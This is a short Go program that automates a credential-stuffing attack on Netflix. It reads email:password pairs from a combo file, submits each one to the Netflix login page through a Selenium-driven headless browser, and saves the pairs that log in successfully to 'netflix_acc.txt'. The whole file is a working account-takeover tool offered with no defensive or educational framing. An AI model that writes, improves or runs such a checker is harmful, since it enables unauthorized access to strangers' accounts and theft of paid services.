package main

import (
	"fmt"
	"sourcegraph.com/sourcegraph/go-selenium"
	"os"
	"bufio"
	"strings"
	"os/exec"
	"time"
)

func main() {
	// Open the file.
	output, _ := os.Create("netflix_acc.txt")
	go exec.Command("java", "-jar", "selenium-server-standalone-3.2.0.jar").Run()
	time.Sleep(50)
	input, _ := os.Open("combo.txt")
	// Create a new Scanner for the file.
	scanner := bufio.NewScanner(input)
	// Loop over all lines in the file and print them.
	for scanner.Scan() {
		line := scanner.Text()
		separats := strings.Split(line, ":")

		fmt.Println(separats[0] + ":" + separats[1])

		caps := selenium.Capabilities{
			"browserName": "phantomjs",
		}
		wd, err := selenium.NewRemote(caps, "")
		if err != nil {
			fmt.Println("Nop")
			panic(err)
		}
		defer wd.Quit()

		// Get simple playground interface
		wd.Get("https://www.netflix.com/es/login")

		email, _ :=  wd.FindElement(selenium.ByName, "email")
		password, _ :=  wd.FindElement(selenium.ByName, "password")
		login, _ := wd.FindElement(selenium.ByCSSSelector, ".btn.login-button.btn-submit.btn-small")
		email.SendKeys(separats[0]);
		password.SendKeys(separats[1]);

		login.Click()

		url, _ := wd.CurrentURL()
		if (strings.Compare(url, "https://www.netflix.com/browse") == 0 ){
			output.WriteString(separats[0]+":"+separats[1])
			fmt.Println("Tenim un match: " + separats[0]+":"+separats[1] + "\n")
		}
	}

}



